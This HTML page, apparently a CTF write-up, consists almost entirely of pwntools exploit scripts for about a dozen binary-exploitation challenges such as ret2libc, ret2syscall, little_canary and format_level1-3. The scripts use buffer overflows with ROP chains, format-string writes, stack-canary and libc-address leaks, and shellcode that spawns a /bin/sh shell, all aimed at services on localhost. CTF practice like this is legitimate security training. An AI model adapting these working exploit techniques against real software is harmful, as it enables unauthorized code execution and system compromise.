<h3 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br><span class="hljs-built_in">context</span>.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">45993</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>leak = int(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><span class="hljs-keyword">base_add </span>= leak - <span class="hljs-number">0x1245</span><br>system_add = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x10A0</span><br><span class="hljs-keyword">bash </span>= <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x4010</span><br>pop_rdi = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x0000000000001323</span><br>ret = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x128D</span><br>success(hex(<span class="hljs-keyword">base_add))</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># gdb.attach(p)</span><br>paylaod = <span class="hljs-keyword">b&#x27;a&#x27; </span>* <span class="hljs-number">0x58</span> + p64(pop_rdi) + p64(<span class="hljs-keyword">bash) </span>+ p64(ret) + p64(system_add)<br>p.sendline(paylaod)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br># p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">54369</span>)<br>p = process(<span class="hljs-string">&#x27;./shellcode_level1&#x27;</span>)<br># gdb.attach(p)<br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>payload = asm(shellcraft.sh())<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<h3 id="Uninitialized-key-plus"><a href="#Uninitialized-key-plus" class="headerlink" title="Uninitialized_key_plus"></a><strong>Uninitialized_key_plus</strong></h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">33067</span>)<br># p = process(<span class="hljs-string">&#x27;./uninitialized_key_plus&#x27;</span>)<br><br>payload = b<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">20</span> + p32(<span class="hljs-number">0x1BF52</span>)<br>p.sendline(payload)<br>p.sendline(b<span class="hljs-string">&quot;\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="format-level1"><a href="#format-level1" class="headerlink" title="format_level1"></a>format_level1</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br># context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">33853</span>)<br># p = process(<span class="hljs-string">&#x27;./format_level1&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%8$n&quot;</span> + p64(<span class="hljs-number">0x804c00c</span>)<br>p.sendline(payload)<br># gdb.attach(p)<br>p.sendline(b<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="rePWNse"><a href="#rePWNse" class="headerlink" title="rePWNse"></a>rePWNse</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">35899</span>)<br># p = process(<span class="hljs-string">&#x27;./rePWNse&#x27;</span>)<br><br><br>pop_rdi = <span class="hljs-number">0x000000000040168e</span><br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span class="hljs-number">7</span><br>p.sendline(<span class="hljs-string">&quot;9&quot;</span>)        #<span class="hljs-number">8</span><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span class="hljs-number">9</span><br>p.sendline(<span class="hljs-string">&quot;9&quot;</span>)        #<span class="hljs-number">10</span><br>p.sendline(<span class="hljs-string">&quot;8&quot;</span>)            #<span class="hljs-number">11</span><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span class="hljs-number">12</span><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)            #<span class="hljs-number">13</span><br><br>p.recvuntil(<span class="hljs-string">&quot;address is:&quot;</span>)<br>leak = int(p.recvline()[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>],<span class="hljs-number">16</span>)<br># gdb.attach(p)<br>payload = b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi)+p64(leak)+p64(<span class="hljs-number">0x401296</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<h3 id="changeable-shellcode"><a href="#changeable-shellcode" class="headerlink" title="changeable_shellcode"></a>changeable_shellcode</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br><br>from ctypes import *<br><br># context<span class="hljs-number">.</span>log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context<span class="hljs-number">.</span>arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">34369</span>)<br># p = process(<span class="hljs-string">&#x27;./shellcode&#x27;</span>)<br><br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rax</span>+<span class="hljs-number">33</span>], <span class="hljs-number">5</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x68732f2f6e69622f</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p<span class="hljs-number">.</span>sendline(asm(shellcode)+b<span class="hljs-string">&#x27;\x0f&#x27;</span>)<br><br>p<span class="hljs-number">.</span>interactive()<br></code></pre></td></tr></table></figure>
<h3 id="format-level2"><a href="#format-level2" class="headerlink" title="format_level2"></a>format_level2</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br>from ctypes import *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment"># context.arch = &quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">40621</span>)<br><span class="hljs-comment"># p = process(&#x27;./format_level2&#x27;)</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;%p&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>stack = <span class="hljs-keyword">int</span>(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">64</span><br>p.sendline(b<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%23p%10$hhn&quot;</span>.ljust(<span class="hljs-number">12</span>, b<span class="hljs-string">&#x27;a&#x27;</span>) + p32(func_ret)<br>p.send(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%147p%10$hhn&quot;</span>.ljust(<span class="hljs-number">12</span>, b<span class="hljs-string">&#x27;a&#x27;</span>) + p32(func_ret+<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,payload)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h3 id="feedback"><a href="#feedback" class="headerlink" title="feedback"></a>feedback</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">42147</span>)<br># p = process(<span class="hljs-string">&#x27;./feedback&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&quot;Which list do you want to write?&quot;</span>,b<span class="hljs-string">&quot;-8&quot;</span>)<br>payload = p64(<span class="hljs-number">0xFBAD1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + b<span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;.\n&quot;</span>,payload)<br><br>p.recvuntil(b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1ec980</span><br>success(hex(libc_base))<br>flag = libc_base + <span class="hljs-number">0x1f1700</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>,b<span class="hljs-string">&quot;-11&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;.&quot;</span>,b<span class="hljs-string">&#x27;\x68&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>,b<span class="hljs-string">&quot;-11&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;.&quot;</span>,p64(flag))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="format-level3"><a href="#format-level3" class="headerlink" title="format_level3"></a>format_level3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = &quot;debug&quot;<br># context.arch = &quot;amd64&quot;<br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">42835</span>)<br># p = process(<span class="hljs-string">&#x27;./format_level3&#x27;</span>)<br><br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>p.sendlineafter(&quot;:&quot;,b&quot;%6$p&quot;)<br>p.recvuntil(&quot;0x&quot;)<br>stack = <span class="hljs-type">int</span>(p.recvline()[:<span class="hljs-number">-1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">4</span><br><br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>payload = &quot;%&#123;&#125;p%6$hhn&quot;.format(func_ret &amp; <span class="hljs-number">0xff</span>)<br>p.sendlineafter(&quot;:&quot;,payload.encode())<br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>payload = &quot;%&#123;&#125;p%14$hn&quot;.format(<span class="hljs-number">0x9317</span>)<br>p.sendlineafter(&quot;:&quot;,payload.encode())<br>p.sendlineafter(&quot;:&quot;,b&quot;4&quot;)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br>from LibcSearcher import*<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, 38193)<br><span class="hljs-comment">#p = process(&#x27;./pwn(1)&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc6_2.7-10ubuntu3_amd64.so&quot;)</span><br><br>pop_rdi = 0x000000000040117e<br>main = 0x4011E8<br><br>p1 = b<span class="hljs-string">&quot;a&quot;</span> * (0x50 + 0x8)<br>p1 += p64(pop_rdi) + p64(elf.got[&#x27;puts&#x27;])<br>p1 += p64(elf.plt[&#x27;puts&#x27;])<br>p1 += p64(main)<br>p.sendline(p1)<br><br>puts_addr = u64(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-6:].ljust(8, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-section">success(&quot;puts:%s&quot;,hex(puts_addr))</span><br><br>libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)<br>libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = libc_base + libc.dump(&#x27;system&#x27;)<br>bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br>p2 = b<span class="hljs-string">&quot;a&quot;</span> * (0x50 + 0x8)<br>one = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]<br><span class="hljs-comment"># p2 += p64(libc_base + one[3])</span><br>p2 += p64(pop_rdi) + p64(bin_addr) + p64(0x40122A)<br>p2 += p64(system_addr)<br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, 40953)<br><span class="hljs-comment"># p = process(&#x27;./ret2syscall&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br>pop_rax = 0x000000000040117e<br>pop_rdi = 0x0000000000401180<br>pop_rsi_rdx = 0x0000000000401182<br>bss = 0x0000000000404060<br>ret = 0x00000000004011C1<br>syscall_addr = 0x401185<br>binsh_addr = 0x0000000000404040<br><br>payload = b<span class="hljs-string">&quot;a&quot;</span> * 0x48<br>payload += p64(pop_rdi) + p64(binsh_addr)  <span class="hljs-comment"># stackoverflow &amp; rdi=binsh_addr</span><br>payload += p64(pop_rsi_rdx) + p64(0) + p64(0)  <span class="hljs-comment"># rsi=0 rdx=0</span><br>payload += p64(pop_rax) + p64(59)  <span class="hljs-comment"># rax=59 </span><br>payload += p64(syscall_addr)  <span class="hljs-comment"># execve(&quot;/bin/sh&quot;,0,0)</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="shellcode-level2"><a href="#shellcode-level2" class="headerlink" title="shellcode_level2"></a>shellcode_level2</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">41523</span>)<br># p = process(<span class="hljs-string">&#x27;./shellcode_level2&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcode_level2&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br>payload = b<span class="hljs-string">&#x27;\x00&#x27;</span>+asm(shellcraft.sh()) <br># gdb.attach(p)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h3 id="little-canary"><a href="#little-canary" class="headerlink" title="little_canary"></a>little_canary</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs erlang"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>from LibcSearcher import *  <br>from ctypes import *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br># context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, <span class="hljs-number">40905</span>)<br># p = process(&#x27;./little_canary&#x27;)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br># libc = ELF(<span class="hljs-string">&quot;./libc-2.32-1.fc33.x86_64.so&quot;</span>)<br><br>main = <span class="hljs-number">0</span>x4012BA<br>pop_rdi = <span class="hljs-number">0</span>x0000000000401343<br><br>p.sendlineafter(b<span class="hljs-string">&quot;name?\n&quot;</span>,b<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">72</span>)<br>p.recvuntil(b<span class="hljs-string">&quot;\n&quot;</span>)<br>canary = u64(b<span class="hljs-string">&quot;\x00&quot;</span>+p.recv(<span class="hljs-number">7</span>))<br># gdb.attach(p)<br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(hex(canary))</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(hex(elf.got[&#x27;puts&#x27;]))</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">b&#x27;a&#x27;</span>*72+<span class="hljs-title">p64</span><span class="hljs-params">(canary)</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(elf.got[&#x27;puts&#x27;])</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(elf.plt[&#x27;puts&#x27;])</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(main)</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">leak</span> = <span class="hljs-title">u64</span><span class="hljs-params">(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))</span></span><br><span class="hljs-function"><span class="hljs-title">leak</span> = <span class="hljs-title">u64</span><span class="hljs-params">(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))</span></span><br><span class="hljs-function"><span class="hljs-title">libc</span> = L<span class="hljs-title">ibcSearcher</span><span class="hljs-params">(&#x27;puts&#x27;,leak)</span>  </span><br><span class="hljs-function"><span class="hljs-title">libc_base</span> = <span class="hljs-title">leak</span> - <span class="hljs-title">libc</span>.<span class="hljs-title">dump</span><span class="hljs-params">(&#x27;puts&#x27;)</span></span><br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(hex(libc_base))</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(b<span class="hljs-string">&quot;payload&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">b&#x27;a&#x27;</span>*72+<span class="hljs-title">p64</span><span class="hljs-params">(canary)</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>))</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>x4012DC)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(libc_base + libc.dump(&#x27;system&#x27;))</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure>
